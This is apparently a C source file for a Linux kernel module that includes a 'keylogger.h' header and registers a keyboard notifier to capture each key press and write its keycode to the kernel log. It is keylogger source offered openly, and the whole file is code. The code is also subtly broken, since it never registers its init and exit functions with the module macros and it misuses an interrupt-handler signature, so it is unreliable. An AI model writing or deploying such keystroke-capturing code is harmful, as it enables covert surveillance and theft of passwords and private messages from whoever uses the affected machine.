#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include "keylogger.h"

#define KBD_IRQ 1  // Keyboard IRQ number

MODULE_LICENSE("GPL");

// Keyboard interrupt handler
irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id)
{
    struct keyboard_notifier_param *param = dev_id;

    if (param && param->value) {
        unsigned int keycode = param->value;

        // Process the keycode as per your requirements
        printk(KERN_INFO "Key pressed: %u\n", keycode);

        // Store the keycode in a linked list or perform any other required operation
    }

    return IRQ_NONE;
}

// Keyboard notifier callback
int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYSYM && param && param->down) {
        // Call the keyboard interrupt handler
        keyboard_interrupt_handler(0, param);
    }

    return NOTIFY_OK;
}

static struct notifier_block keyboard_notifier_block = {
    .notifier_call = keyboard_notifier_callback,
};

int __init keyboard_module_init(void)
{
    int result;

    // Register the keyboard notifier
    result = register_keyboard_notifier(&keyboard_notifier_block);
    if (result != 0) {
        printk(KERN_ERR "Failed to register keyboard notifier\n");
        return result;
    }

    printk(KERN_INFO "Keyboard module initialized\n");
    return 0;
}

void __exit keyboard_module_exit(void)
{
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&keyboard_notifier_block);

    printk(KERN_INFO "Keyboard module exited\n");
}
